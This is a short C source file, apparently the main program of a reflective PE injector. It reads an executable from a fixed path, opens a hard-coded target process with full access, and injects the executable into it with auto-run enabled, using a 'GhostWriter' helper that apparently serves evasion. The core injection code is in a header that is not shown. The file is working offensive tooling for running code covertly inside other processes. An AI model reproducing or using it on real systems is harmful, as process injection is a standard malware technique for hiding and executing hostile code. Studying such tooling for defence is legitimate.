/*
	Copyright 2019 Ognyan Mirev
	Permission is hereby granted, free of charge, to any person
	obtaining a copy of this software and associated documentation
	files (the "Software"), to deal in the Software without restriction,
	including without limitation the rights to use, copy, modify, merge,
	publish, distribute, sublicense, and/or sell copies of the Software,
	and to permit persons to whom the Software is furnished to do so,
	subject to the following conditions:
	The above copyright notice and this permission notice shall be included
	in all copies or substantial portions of the Software.
	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS
	OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
	FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
	AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,
	WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
	CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

#include "ReflectiveInjector.h"


void ReadPE(PE* pe, char* Filename)
{
	HANDLE hFile = CreateFileA(Filename, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);

	pe->Size = GetFileSize(hFile, NULL);

	pe->File = malloc(pe->Size);
	DWORD BytesRead;
	ReadFile(hFile, pe->File, pe->Size, &BytesRead, NULL);

	CloseHandle(hFile);

	InitPE(pe, pe->File, pe->Size);
}

#define ALOT 100000000
#define TARGET_PID 1528
#define PAYLOAD "C:\\filez\\target.exe"


int main()
{
	GHOSTWRITER ghostWriter;
	InitGhostWriter(&ghostWriter);

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, TARGET_PID);

	PE pe;
	ReadPE(&pe, PAYLOAD);

	ReflectiveInject(hProc, INVALID_HANDLE_VALUE, &pe, INJECTOR_AUTO_RUN | INJECTOR_BUILD_IAT, &ghostWriter);

	return 0;
}
